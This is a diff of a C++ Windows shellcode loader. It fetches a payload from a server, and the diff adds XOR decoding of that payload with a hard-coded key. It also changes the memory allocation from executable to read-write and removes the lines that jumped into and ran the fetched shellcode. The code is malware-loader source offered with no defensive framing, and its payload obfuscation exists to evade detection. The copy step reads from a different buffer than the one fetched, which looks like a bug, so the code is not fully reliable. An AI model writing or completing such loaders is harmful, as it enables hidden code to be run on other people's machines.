@@ -15,6 +15,12 @@ typedef struct Params {
 
 typedef VOID(*fprun)(PARAMS pParams);
 
+void xorEncryptDecrypt(std::vector<char>& data, char key) {
+    for (size_t i = 0; i < data.size(); i++) {
+        data[i] = data[i] ^ key;
+    }
+}
+
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
     std::wstring serverName = L"127.0.0.1";
@@ -56,6 +62,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         } while (dS > 0);
 
         if (!PEb.empty()) {
+
+            xorEncryptDecrypt(PEb, 'X'); 
+
             shellcodeFetched = true;
         } else {
             std::this_thread::sleep_for(std::chrono::seconds(5));
@@ -68,11 +77,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
 
     PARAMS pParams;
-    pParams.pBaseAddress = VirtualAlloc(NULL, PEb.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    pParams.pBaseAddress = VirtualAlloc(NULL, PEb.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     memcpy(pParams.pBaseAddress, PE, PEb.size());
-
-    fprun run = (fprun)pParams.pBaseAddress;
-    run(pParams);
 
     return 0;
 }
+ 
